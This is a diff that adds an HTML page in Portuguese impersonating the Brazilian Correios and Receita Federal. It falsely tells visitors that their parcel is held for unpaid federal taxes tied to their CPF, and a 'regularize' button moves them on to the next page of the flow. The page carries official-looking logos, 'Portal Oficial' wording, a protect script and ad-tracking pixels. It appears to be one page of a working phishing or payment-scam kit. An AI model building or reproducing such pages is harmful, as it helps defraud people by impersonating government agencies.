@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <script src="assets/js/protect.js?v=20260814clear"></script>
+  <script src="assets/js/pixel-loader-utmify.js"></script>
+  <script src="assets/js/pixel-utmify.js"></script>
+  <meta name="theme-color" content="#003366">
+  <title>Objeto Localizado | Rastreamento</title>
+  <link rel="stylesheet" href="assets/css/correios-mobile.css?v=20260814f">
+</head>
+<body>
+  <div class="page page-index3 page-rastreio3">
+    <div class="index3-bg" aria-hidden="true">
+      <h1 class="page-title">Rastreamento de Encomendas</h1>
+      <p class="page-subtitle">Portal Oficial de Consulta Fiscal</p>
+      <div class="index3-search-blur">
+        <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><path fill="#003366" d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+        <span id="codigoBlur">AA 000 000 000 BR</span>
+      </div>
+    </div>
+
+    <div class="index3-modal-wrap">
+      <article class="index3-modal">
+        <div class="index3-modal-logo">
+          <img src="assets/img/logo2.png" alt="Receita Federal" width="34" height="34">
+          <span>Receita Federal</span>
+        </div>
+
+        <h2 class="rastreio3-found-title">Objeto Localizado</h2>
+        <p class="rastreio3-found-code" id="codigoModal">AA 000 000 000 BR</p>
+
+        <div class="index3-alert">
+          <div class="index3-alert-head">
+            <span class="index3-alert-icon">!</span>
+            <strong>PENDÊNCIA FISCAL IDENTIFICADA</strong>
+          </div>
+          <ul>
+            <li>Objeto retido aguardando regularização tributária.</li>
+            <li>Motivo: Pendência de tributos federais vinculados ao CPF.</li>
+            <li>Ação necessária: Verificar detalhes para prosseguir com a entrega.</li>
+          </ul>
+        </div>
+
+        <a href="#" id="link-detalhes" class="btn-index3-green">VER DETALHES E REGULARIZAR</a>
+
+        <div class="index3-modal-foot">
+          <span>
+            <svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="#003366" d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+            Sistema oficial de regularização
+          </span>
+          <span>
+            <svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="#003366" d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm1 11h5v-2h-4V7h-2v6z"/></svg>
+            Consulta disponível 24 horas
+          </span>
+        </div>
+      </article>
+    </div>
+
+    <footer class="footer-gov index3-footer">
+      <img src="assets/img/rodape2.png" alt="Correios - Governo Federal" class="footer-rodape">
+      <p class="index3-copy">© 2026 Correios • Receita Federal do Brasil. Todos os direitos reservados.</p>
+    </footer>
+  </div>
+
+  <script>
+    var params = new URLSearchParams(window.location.search);
+    var codigo = (params.get("codigo") || "").replace(/[^A-Z0-9]/g, "").toUpperCase();
+    function buildRedirectUrl(path, updates) {
+      var nextParams = new URLSearchParams(window.location.search);
+      Object.keys(updates).forEach(function (key) {
+        var value = updates[key];
+        if (value === null || value === undefined || value === "") {
+          nextParams.delete(key);
+          return;
+        }
+        nextParams.set(key, value);
+      });
+      var query = nextParams.toString();
+      return path + (query ? "?" + query : "");
+    }
+
+    if (!/^[A-Z]{2}[0-9]{9}[A-Z]{2}$/.test(codigo)) {
+      window.location.href = "index.html";
+    } else {
+      function formatarCodigo(c) {
+        return c.slice(0, 2) + " " + c.slice(2, 5) + " " + c.slice(5, 8) + " " + c.slice(8, 11) + " " + c.slice(11, 13);
+      }
+
+      var codigoFormatado = formatarCodigo(codigo);
+      document.getElementById("codigoModal").textContent = codigoFormatado;
+      document.getElementById("codigoBlur").textContent = codigoFormatado;
+      document.getElementById("link-detalhes").href = buildRedirectUrl("rastreio4.html", { codigo: codigo });
+    }
+  </script>
+</body>
+</html>
